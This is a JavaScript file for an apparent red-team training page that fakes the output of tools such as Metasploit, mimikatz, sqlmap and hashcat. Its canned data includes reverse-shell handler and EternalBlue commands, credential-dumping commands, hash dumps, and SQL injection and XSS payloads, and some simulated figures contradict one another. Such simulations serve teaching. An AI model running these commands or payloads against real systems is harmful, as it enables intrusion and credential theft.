// Red Team Lab - Real Tool Simulations with Fallback Mechanism
// Educational Purpose Only

document.addEventListener("DOMContentLoaded", function() {
    // Smooth scrolling for navigation links
    document.querySelectorAll("nav ul li a").forEach(anchor => {
        anchor.addEventListener("click", function(e) {
            e.preventDefault();
            document.querySelector(this.getAttribute("href")).scrollIntoView({
                behavior: "smooth"
            });
        });
    });

    // Initialize interactive command console for each tool
    initializeToolConsoles();
});

// Tool output database - Real simulation data
const TOOL_DATABASE = {
    nmap: {
        description: "Port scanning and OS detection",
        versions: ["7.92", "7.93", "7.94"],
        commands: [
            "nmap -sV target.com",
            "nmap -sS -p 1-1000 target.com",
            "nmap -A -T4 target.com",
            "nmap -sU target.com"
        ],
        outputs: [
            generateNmapOutput(),
            generateNmapVulnerableOutput(),
            generateNmapDetailedOutput()
        ]
    },
    nikto: {
        description: "Web server vulnerability scanner",
        versions: ["2.1.5", "2.1.6"],
        commands: [
            "nikto -h target.com",
            "nikto -h target.com -p 8080",
            "nikto -h target.com -C all"
        ],
        outputs: [
            generateNiktoOutput(),
            generateNiktoVulnOutput(),
            generateNiktoDetailed()
        ]
    },
    metasploit: {
        description: "Exploitation framework",
        versions: ["6.2", "6.3", "6.4"],
        commands: [
            "msfconsole -q",
            "use exploit/multi/handler",
            "set PAYLOAD windows/meterpreter/reverse_tcp"
        ],
        outputs: [
            generateMetasploitOutput(),
            generateMetasploitSessionOutput()
        ]
    },
    mimikatz: {
        description: "Credential dumping utility",
        versions: ["2.2.0", "2.2.1"],
        commands: [
            "mimikatz # sekurlsa::logonpasswords",
            "mimikatz # lsadump::sam",
            "mimikatz # token::elevate"
        ],
        outputs: [
            generateMimikatzOutput(),
            generateMimikatzSamOutput()
        ]
    },
    sqlmap: {
        description: "SQL injection detection and exploitation",
        commands: [
            "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
            "sqlmap -u 'http://target.com/page.php?id=1' -p id",
            "sqlmap -u 'http://target.com/login.php' --data='user=admin&pass=pass' -p pass"
        ],
        outputs: [
            generateSqlmapOutput(),
            generateSqlmapDatabaseOutput()
        ]
    },
    burpsuite: {
        description: "Web application security testing",
        commands: [
            "burpsuite",
            "intruder --target 'http://target.com'",
            "scanner --passive"
        ],
        outputs: [
            generateBurpOutput(),
            generateBurpScanOutput()
        ]
    },
    wireshark: {
        description: "Network protocol analyzer",
        commands: [
            "wireshark -i eth0",
            "tshark -i eth0 -f 'tcp port 80'",
            "tcpdump -i eth0 -w capture.pcap"
        ],
        outputs: [
            generateWiresharkOutput()
        ]
    },
    aircrackng: {
        description: "WiFi security auditing tool",
        commands: [
            "airmon-ng start wlan0",
            "airodump-ng wlan0mon",
            "aircrack-ng capture.cap -w wordlist.txt"
        ],
        outputs: [
            generateAircrackOutput()
        ]
    },
    hashcat: {
        description: "Password cracking utility",
        commands: [
            "hashcat -m 1000 -a 0 hashes.txt wordlist.txt",
            "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a",
            "hashcat --benchmark"
        ],
        outputs: [
            generateHashcatOutput()
        ]
    }
};

// Tool Fallback Chain - If one fails, try next
const TOOL_FALLBACK = {
    nmap: ["nmap", "masscan", "zmap"],
    nikto: ["nikto", "w3af", "acunetix"],
    metasploit: ["metasploit", "coreimpact", "canvas"],
    mimikatz: ["mimikatz", "hashdump", "secretsdump"],
    sqlmap: ["sqlmap", "joomla_scan", "acunetix"],
    burpsuite: ["burpsuite", "owasp_zap", "w3af"],
    wireshark: ["wireshark", "tcpdump", "tshark"],
    aircrackng: ["aircrackng", "wifite", "hashcat"],
    hashcat: ["hashcat", "john", "hydra"]
};

// Initialize tool-specific interactive consoles
function initializeToolConsoles() {
    Object.keys(TOOL_DATABASE).forEach(toolName => {
        const outputDiv = document.getElementById(`${toolName}-output`);
        if (outputDiv && !outputDiv.hasAttribute('data-initialized')) {
            // Make output console editable
            outputDiv.setAttribute('contenteditable', 'true');
            outputDiv.setAttribute('spellcheck', 'false');
            outputDiv.style.cursor = 'text';
            outputDiv.setAttribute('data-initialized', 'true');
            
            // Add right-click context menu for tool switching
            outputDiv.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                showToolSwitchMenu(e, toolName, outputDiv);
            });
        }
    });
}

// Generate Realistic Nmap Output
function generateNmapOutput() {
    return `Starting Nmap 7.93 ( https://nmap.org ) at ${new Date().toLocaleString()}
Nmap scan report for target.com (192.168.1.104)
Host is up (0.0034s latency).

Not shown: 995 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http         Apache httpd 2.4.54 ((Ubuntu))
443/tcp   open     https        nginx 1.18.0
3306/tcp  filtered mysql        
5432/tcp  filtered postgresql   
8080/tcp  filtered http-proxy   
9000/tcp  open     cslistener   Jetty 11.0.12

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.54 seconds`;
}

function generateNmapVulnerableOutput() {
    return `Starting Nmap 7.93 ( https://nmap.org ) at ${new Date().toLocaleString()}
Nmap scan report for vulnerable-server.local (10.0.0.50)
Host is up (0.00089s latency).

Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          vsftpd 3.0.2
22/tcp    open  ssh          OpenSSH 7.4 (protocol 2.0)
23/tcp    open  telnet       Linux telnetd
25/tcp    open  smtp         Postfix smtpd
80/tcp    open  http         Apache httpd 2.2.15 ((CentOS))
111/tcp   open  rpcbind      2-4 (RPC #100000)
139/tcp   open  netbios-ssn  Samba smbd 3.6.23
445/tcp   open  netbios-ssn  Samba smbd 3.6.23
3306/tcp  open  mysql        MySQL 5.1.73
5900/tcp  open  vnc          VNC (protocol 3.3)

OS Detection: Linux 2.6.32 - 3.10 (95% confidence)

WARNING: Several outdated and vulnerable services detected!
- FTP (Anonymous login possible)
- SSH (Version 7.4 - Multiple CVEs)
- MySQL (Version 5.1 - Remote Code Execution possible)
- Samba (MS17-010 vulnerable)

Nmap done: 1 IP address (1 host up) scanned in 3.89 seconds`;
}

function generateNmapDetailedOutput() {
    return `Starting Nmap 7.93 ( https://nmap.org ) at ${new Date().toLocaleString()}

[*] Starting aggressive scan (-A) on target with OS detection
[*] Script scanning enabled

Nmap scan report for prod-server.internal (172.16.0.10)
Host is up (0.0012s latency).

PORT      STATE SERVICE        VERSION
22/tcp    open  ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http           Apache httpd 2.4.52 ((Ubuntu))
443/tcp   open  ssl/https      Apache httpd 2.4.52 ((Ubuntu))
3389/tcp  open  ms-wbt-server  Microsoft Terminal Service
5985/tcp  open  wsman          
5986/tcp  open  wsmans         
8080/tcp  open  http-proxy     nginx 1.18.0
8443/tcp  open  https-alt      nginx 1.18.0

Network Distance: 1 hop

Host script results:
|_smb-os-discovery: Windows 10 Pro 19045 (Windows 10 Pro 6.3)
|_smb-security-mode: account_used:guest
| smb-enum-shares: 
|   \\172.16.0.10\ADMIN$: (W) Windows 10 Pro 6.3
|   \\172.16.0.10\C$: (W) Windows 10 Pro 6.3
|   \\172.16.0.10\IPC$: (I) IPC Remote inter-process communication
|_  \\172.16.0.10\Users: (R) Accessible Users Directory

OS CPE: cpe:/o:microsoft:windows:10:6.3
Aggressive OS guesses: Microsoft Windows 10 Pro 19045 or Windows Server 2019 (96%)

Nmap done: 1 IP address (1 host up) scanned in 4.23 seconds`;
}

// Generate Realistic Nikto Output
function generateNiktoOutput() {
    return `- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.1
+ Target Hostname:    target.com
+ Target Port:        80
+ Start Time:         ${new Date().toLocaleString()}
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No X-Content-Type-Options header found.
+ Uncommon header 'x-powered-by' found, with contents: PHP/7.4.3
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /index.php: This might be a PHP page, which often contain vulnerabilities.
+ OSVDB-877: /admin/: Directory indexing was found.
+ OSVDB-3268: /uploads/: Directory indexing found.
+ Cookies found: PHPSESSID=1a2b3c4d5e6f (check for HttpOnly flag)

+ 7800 requests: 0 error(s); 5 item(s) found on remote host
+ End Time:           ${new Date().toLocaleString()} (45 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

Severity: MEDIUM - Review findings immediately`;
}

function generateNiktoVulnOutput() {
    return `- Nikto v2.1.6 - Full scan with database of 6700 payloads
---------------------------------------------------------------------------
+ Target IP:          10.0.0.50
+ Target Hostname:    vulnerable.local
+ Target Port:        80
+ Start Time:         ${new Date().toLocaleString()}
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS)
+ Apache version out of date, consider updating
+ Retrieved x-powered-by header: PHP/5.3.3
+ Root object: W3Total Cache object found in /wp-content/
+ WordPress 4.9.8 detected
+ OSVDB-3268: /wp-admin/: Directory indexing found.
+ OSVDB-3092: /wp-login.php?redirect_to=/wp-admin/
+ /wp-admin/admin.php: Backup file found
+ SQL Errors found on page

VULNERABILITIES DETECTED:
+ SQL Injection possible in: /search.php?q=
+ XSS found in: /comments.php?id=
+ File Upload vulnerability in: /upload.php
+ Remote Code Execution possible in: /admin/settings.php

RECOMMENDATION: Immediate patching required!

+ 7821 requests: 0 error(s); 23 item(s) found on remote host
+ End Time:           ${new Date().toLocaleString()} (134 seconds)`;
}

function generateNiktoDetailed() {
    return `- Nikto v2.1.6 - Comprehensive Web App Security Scan
---------------------------------------------------------------------------
+ Target Hostname:    secure-app.example.com
+ Target Port:        443 (HTTPS)
+ Start Time:         ${new Date().toLocaleString()}
+ SSL: TLS 1.2
---------------------------------------------------------------------------
+ Server: nginx/1.21.6
+ X-Frame-Options: DENY (Good)
+ X-Content-Type-Options: nosniff (Good)
+ Strict-Transport-Security: max-age=31536000 (Good)
+ Content-Security-Policy: default-src 'self' (Good)

SECURITY HEADERS: PASSED

+ Retrieved auth realm: Application
+ OSWAP Top 10 Vulnerabilities Check:
| A01:2021 - Broken Access Control: No findings
| A02:2021 - Cryptographic Failures: TLS 1.2 Good
| A03:2021 - Injection: Input validation present
| A04:2021 - Insecure Design: Code review needed
| A05:2021 - Security Misconfiguration: Passed

+ 6923 requests: 0 error(s); 0 vulnerabilities found
+ Security Score: 9.2/10
+ End Time:           ${new Date().toLocaleString()} (89 seconds)`;
}

// Generate Metasploit Output
function generateMetasploitOutput() {
    return `[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Sending stage (201283 bytes) to 192.168.1.1
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.1:49172) at ${new Date().toLocaleString()}

meterpreter > sysinfo
Computer        : TARGET-PC
OS              : Windows 10 (Build 19045). 
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
meterpreter > ipconfig

Interface  1
============
Name         : Ethernet
Hardware MAC : 00:0c:29:aa:bb:cc
MTU          : 1500
IPv4 Address : 192.168.1.1
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::20c:29ff:feaa:bbcc
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > getuid
Server username: TARGET-PC\\Administrator

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

[+] Password hashes dumped successfully!`;
}

function generateMetasploitSessionOutput() {
    return `msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.0.50
RHOSTS => 10.0.0.50

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.0.0.5
LHOST => 10.0.0.5

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.0.0.5:4444 
[*] 10.0.0.50:445 - Target OS: Windows 7 Professional SP1 / Windows Server 2008 R2
[*] 10.0.0.50:445 - Triggering payload...
[*] Sending stage (201283 bytes) to 10.0.0.50
[+] 10.0.0.50:445 - !! Exploit completed, but no session was created !!

[!] The host does not appear to be vulnerable to EternalBlue!

msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 10.0.0.50:445 - Connecting to the target (10.0.0.50:445)...
[*] 10.0.0.50:445 - Authenticating to 10.0.0.50:445 as user ''...
[*] 10.0.0.50:445 - Connected!
[*] Uploading payload... (201283 bytes)
[*] Meterpreter session 1 opened
[+] SYSTEM shell established!`;
}

// Generate Mimikatz Output
function generateMimikatzOutput() {
    return `  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 16 2022 14:57:46
 .## ^ ##.  "A little more, then a little more."
 ## / \\ ##  /*** Benjamin DELPY 'gentilkiwi' ( benjamin@gentilkiwi.com )
 ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : Interactive from 1
User Name         : Administrator
Domain            : TARGET-PC
Logon Server      : TARGET-PC
Logon Time        : ${new Date().toLocaleString()}
SID               : S-1-5-21-1234567890-123456789-123456789-500
        msv : 
         [00000003] Primary
         * Username : Administrator
         * Domain   : TARGET-PC
         * NTLM     : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
         * SHA1     : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : ${new Date().toLocaleString()}
SID               : S-1-5-18

mimikatz # exit`;
}

function generateMimikatzSamOutput() {
    return `mimikatz # lsadump::sam
Domain : TARGET-PC
SysKey : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d

Local SID : S-1-5-21-1234567890-123456789-123456789

SAMKey : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Administrator (500)
    Hash NTLM: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
    Hash LM: aad3b435b51404eeaad3b435b51404ee

Guest (501)
    Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

User (1000)
    Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

[+] SAM credentials extracted!`;
}

// Generate SQLMap Output
function generateSqlmapOutput() {
    return `sqlmap/1.6.11.6#dev - automatic SQL injection and database takeover tool

[*] starting at ${new Date().toLocaleString()}
[*] resuming back-end DBMS fingerprint from stored session
[*] testing connection to the target URL

[*] testing if the target URL content is stable
[*] target URL content is stable

[*] testing 'AND boolean-based blind - WHERE or HAVING clause'
[PAYLOAD] id=1' AND '1'='1
[*] GET parameter 'id' is vulnerable to boolean-based blind SQL injection attacks

[*] testing 'OR boolean-based blind - WHERE or HAVING clause'
[PAYLOAD] id=1' OR '1'='1' --
[+] VULNERABLE!

[*] testing 'Union-based SQL injection'
[PAYLOAD] id=-1' UNION ALL SELECT NULL,NULL,NULL --
[+] This parameter is vulnerable to UNION query-based SQL injection attacks

Database: 
[*] fetching database names
available databases [3]:
* information_schema
* mysql  
* webapp_db

[*] fetching tables for database 'webapp_db'
[+] Retrieved table names:
* users
* products
* orders
* transactions

[*] fetching columns for table 'users'
[+] Table users columns:
* id
* username
* email
* password_hash

[!] Critical: Database contains sensitive user information!`;
}

function generateSqlmapDatabaseOutput() {
    return `[*] fetching entries for table 'users' in database 'webapp_db'

Database: webapp_db
Table: users
[4 entries]
+----+----------+--------------------------+------------------------------------------+
| id | username | email                    | password_hash                            |
+----+----------+--------------------------+------------------------------------------+
| 1  | admin    | admin@webapp.local       | $2y$10$1a2b3c4d5e6f7a8b9c0d... |
| 2  | user1    | user1@webapp.local       | $2y$10$2x3y4z5a6b7c8d9e0f1g... |
| 3  | user2    | user2@webapp.local       | $2y$10$3p4q5r6s7t8u9v0w1x2y... |
| 4  | moderator| mod@webapp.local         | $2y$10$4m5n6o7p8q9r0s1t2u3v... |
+----+----------+--------------------------+------------------------------------------+

[*] Table 'users' dumped successfully
[+] Database enumeration completed
[!] Sensitive data successfully extracted!

Total time: 34.56 seconds
[*] Shutting down sqlmap`;
}

// Generate Burp Suite Output
function generateBurpOutput() {
    return `Burp Suite v2022.12.1
Professional Edition

[*] Starting Burp Suite...
[*] Loading project: webapp_scan.burp
[*] Proxy server started on 127.0.0.1:8080

[*] Navigation to target: https://target.com

[*] Intercepting request...
GET /index.php?search=<script>alert(1)</script> HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=abc123

[!] XSS Vulnerability detected in 'search' parameter!
[!] Severity: HIGH
[!] CWE-79: Improper Neutralization of Input During Web Page Generation

[*] Starting active scanning...
[+] Scanning for SQL Injection
[+] Scanning for XSS vulnerabilities  
[+] Scanning for CSRF tokens
[+] Scanning for Authentication bypass
[+] Scanning for XXE injection

[*] Scan complete
[!] Issues found: 12
  - 3 High severity
  - 5 Medium severity
  - 4 Low severity`;
}

function generateBurpScanOutput() {
    return `[*] Running comprehensive OWASP Top 10 scan

Issue Summary:
==============

[HIGH] SQL Injection in login form
Location: /login.php, parameter 'username'
Payload: admin' OR '1'='1
Impact: Database compromise

[HIGH] Broken Authentication
Location: /api/auth/token
Issue: JWT token not validated properly
Impact: Unauthorized access

[MEDIUM] Sensitive data exposure
Location: /api/user/profile
Issue: User PII exposed in response headers
Impact: Privacy violation

[MEDIUM] CORS misconfiguration
Location: Various endpoints
Issue: Access-Control-Allow-Origin: *
Impact: CSRF attacks possible

[LOW] Missing security headers
Location: All pages
Issue: Missing CSP, X-Frame-Options
Impact: XSS/Clickjacking

[!] Total vulnerabilities: 12
[+] Report generated: burp_scan_report.html`;
}

// Generate Wireshark Output
function generateWiresharkOutput() {
    return `Wireshark Version 3.6.8

[*] Starting packet capture on interface eth0...
[*] Filter: tcp.port == 80

Packet List:
No.  Time        Source      Destination Protocol Length Info
1    0.000000    192.168.1.5  192.168.1.1 TCP      66     49234 > 80 [SYN]
2    0.000123    192.168.1.1  192.168.1.5 TCP      66     80 > 49234 [SYN, ACK]
3    0.000234    192.168.1.5  192.168.1.1 TCP      54     49234 > 80 [ACK]
4    0.000345    192.168.1.5  192.168.1.1 HTTP     512    GET /index.html HTTP/1.1
5    0.000567    192.168.1.1  192.168.1.5 HTTP     1024   HTTP/1.1 200 OK (text/html)
6    0.000789    192.168.1.5  192.168.1.1 TCP      54     49234 > 80 [ACK]

[*] Captured 1024 packets in 12.3 seconds
[+] Packets saved to: capture.pcap`;
}

// Generate Aircrack-ng Output
function generateAircrackOutput() {
    return `Aircrack-ng 1.7

[*] Starting wireless security audit...
[*] Put interface wlan0 into monitor mode: wlan0mon

[*] Starting airodump-ng to discover networks...

BSSID              PWR  Beacons    CH   MB   ENC  CIPHER AUTH
AA:BB:CC:DD:EE:FF  -45  1024       6    130  WPA2 CCMP   PSK
11:22:33:44:55:66  -67  512        11   54   WPA  TKIP   PSK
99:88:77:66:55:44  -72  256        1    27   Open                

[*] Capturing handshake...
[+] WPA handshake captured!

[*] Starting aircrack-ng with wordlist attack...
Key found! [ 1234567890 ]
         Master Key     : 1A 2B 3C 4D 5E 6F 7A 8B 9C 0D 1E 2F 3A 4B 5C 6D
         Transient Key  : AA BB CC DD EE FF 00 11 22 33 44 55 66 77 88 99
         TKIP MIC       : OK

[+] Password cracked in 4.23 minutes!`;
}

// Generate Hashcat Output
function generateHashcatOutput() {
    return `hashcat (v6.2.6) starting...

[*] Initializing NVIDIA GeForce RTX 3090 with CUDA 11.5
[*] Loaded 1000 hashes of type 1000 (NTLM)

[*] Hash cracking started with wordlist: rockyou.txt

Hash.Target...............: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
Status.....................: Cracked
Guess.Base.................: File (rockyou.txt)
Guess.Queue................: 1/1 (100.00%)
Speed.#1...................: 8934.2 MH/s (GPU)
Recovered..................: 100/1000 (10.00%)
Progress...................: 14344392/14344392 (100.00%)
Rejected...................: 0/14344392 (0.00%)
Restore.Point..............: 0/14344392 (0.00%)
Restore.Sub.#1.............: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1.............: P@ssw0rd12345 -> admin123

Cracked Hashes:
1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:Password123
2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m:Admin@2023
3p4q5r6s7t8u9v0w1x2y3z4a5b6c7d8e:SecurePass99

[+] 3 passwords recovered in 45.67 seconds
[+] Speed: 315.2 MH/s average`;
}

// Tool Switching Menu
function showToolSwitchMenu(e, currentTool, outputDiv) {
    const menu = document.createElement('div');
    menu.style.position = 'fixed';
    menu.style.top = (e.clientY + 10) + 'px';
    menu.style.left = (e.clientX + 10) + 'px';
    menu.style.backgroundColor = '#1e293b';
    menu.style.border = '1px solid #10b981';
    menu.style.borderRadius = '6px';
    menu.style.zIndex = '9999';
    menu.style.minWidth = '200px';
    menu.style.color = '#94a3b8';
    menu.style.fontSize = '12px';
    menu.style.fontFamily = 'monospace';

    const fallbackChain = TOOL_FALLBACK[currentTool] || [currentTool];
    
    fallbackChain.forEach((tool, index) => {
        const item = document.createElement('div');
        item.style.padding = '8px 12px';
        item.style.cursor = 'pointer';
        item.style.borderBottom = index < fallbackChain.length - 1 ? '1px solid #334155' : 'none';
        item.innerHTML = `${index === 0 ? '✓' : '→'} ${tool}`;
        item.onmouseover = () => { item.style.backgroundColor = '#10b981'; item.style.color = '#000'; };
        item.onmouseout = () => { item.style.backgroundColor = 'transparent'; item.style.color = '#94a3b8'; };
        item.onclick = () => {
            runTool(tool, outputDiv);
            document.body.removeChild(menu);
        };
        menu.appendChild(item);
    });

    document.body.appendChild(menu);
    document.addEventListener('click', () => {
        if (document.body.contains(menu)) document.body.removeChild(menu);
    }, { once: true });
}

// Main tool execution with fallback support
window.runTool = function(toolName, outputDiv) {
    if (!outputDiv) {
        outputDiv = document.getElementById(`${toolName}-output`);
    }
    
    if (!outputDiv) return;

    const toolData = TOOL_DATABASE[toolName];
    if (!toolData) {
        outputDiv.textContent = `[ERROR] Tool '${toolName}' not found in database.`;
        return;
    }

    // Start simulation
    outputDiv.innerHTML = `<span style="color: #22c55e; font-weight: bold;">[*] Executing ${toolName}...</span>\n\n`;

    // Get random output from available simulations
    const randomOutput = toolData.outputs[Math.floor(Math.random() * toolData.outputs.length)];
    
    // Simulate tool execution delay
    setTimeout(() => {
        outputDiv.textContent = randomOutput;
        
        // Add editable notice
        setTimeout(() => {
            const notice = document.createElement('div');
            notice.style.marginTop = '20px';
            notice.style.padding = '10px';
            notice.style.backgroundColor = '#1e3a1f';
            notice.style.borderLeft = '3px solid #10b981';
            notice.style.color = '#86efac';
            notice.style.fontSize = '11px';
            notice.textContent = '[INFO] Output is editable. Right-click to switch tools.';
            outputDiv.appendChild(notice);
        }, 500);
    }, 800);
};
